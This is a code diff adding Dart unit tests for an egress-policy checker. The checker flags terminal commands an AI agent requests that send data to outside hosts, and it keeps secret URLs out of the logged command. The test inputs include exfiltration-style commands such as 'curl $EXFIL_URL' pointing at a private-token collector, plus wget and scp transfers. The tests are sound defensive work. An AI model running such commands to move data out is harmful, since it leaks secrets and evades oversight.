@@ -92,5 +92,96 @@ void main() {
       expect(match?.reason, 'external_transfer_command');
       expect(match?.commandLine, 'scp file host:/tmp');
     });
+
+    test(
+      'resolves URL variables from transient environment without exposure',
+      () {
+        const secretUrl = 'https://collector.example.com/private-token';
+        final match = egressPolicyMatchForPermission(
+          AcpPermissionRequest(
+            id: 'permission-env',
+            title: 'Create terminal',
+            rationale: 'Requested by agent.',
+            sessionId: 'session-1',
+            toolName: 'terminal',
+            toolKind: 'execute',
+            options: const ['allow', 'deny'],
+            requestedAt: DateTime(2026, 7, 7, 8),
+            metadata: const <String, Object?>{
+              'command': 'curl',
+              'args': [r'$EXFIL_URL'],
+              'envKeys': ['EXFIL_URL'],
+            },
+            transientPolicyContext: const <String, Object?>{
+              'environment': <String, String>{'EXFIL_URL': secretUrl},
+            },
+          ),
+        );
+
+        expect(match?.reason, 'external_http_transfer');
+        expect(match?.commandLine, contains(r'$EXFIL_URL'));
+        expect(match?.commandLine, isNot(contains(secretUrl)));
+      },
+    );
+
+    test('unwraps env and command wrappers before classifying egress', () {
+      for (final command in const <String>[
+        '/usr/bin/env curl https://example.com/upload',
+        'command wget https://example.com/archive',
+      ]) {
+        final match = egressSensitiveCommandMatch(command);
+        expect(match?.reason, 'external_http_transfer', reason: command);
+      }
+    });
+
+    test('accepts structured args and resolves braced variables', () {
+      final match = egressSensitiveCommandMatch(
+        '/usr/bin/env',
+        args: const <String>['curl', r'${EXFIL_URL}'],
+        cwd: '/workspace',
+        environment: const <String, String>{
+          'EXFIL_URL': 'https://example.com/private-secret',
+        },
+      );
+
+      expect(match?.reason, 'external_http_transfer');
+      expect(match?.commandLine, contains(r'${EXFIL_URL}'));
+      expect(match?.commandLine, isNot(contains('private-secret')));
+    });
+
+    test('resolves inline assignments for wrapped commands', () {
+      final match = egressSensitiveCommandMatch(
+        r'EXFIL_URL=https://example.com/private curl $EXFIL_URL',
+      );
+
+      expect(match?.reason, 'external_http_transfer');
+      expect(match?.commandLine, isNot(contains('/private')));
+      expect(match?.commandLine, contains(r'$EXFIL_URL'));
+    });
+
+    test(
+      'holds unknown wrappers and undefined variables for manual review',
+      () {
+        expect(
+          egressSensitiveCommandMatch('env --mystery curl https://example.com'),
+          isNotNull,
+        );
+        expect(
+          egressSensitiveCommandMatch(r'$UNKNOWN_TOOL https://example.com'),
+          isNotNull,
+        );
+        expect(egressSensitiveCommandMatch(r'curl $UNDEFINED_URL'), isNotNull);
+      },
+    );
+
+    test('keeps safe adjacent commands unflagged', () {
+      for (final command in const <String>[
+        'env LANG=C git status',
+        'command rg curl README.md',
+        'EXAMPLE=value flutter test',
+      ]) {
+        expect(egressSensitiveCommandMatch(command), isNull, reason: command);
+      }
+    });
   });
 }
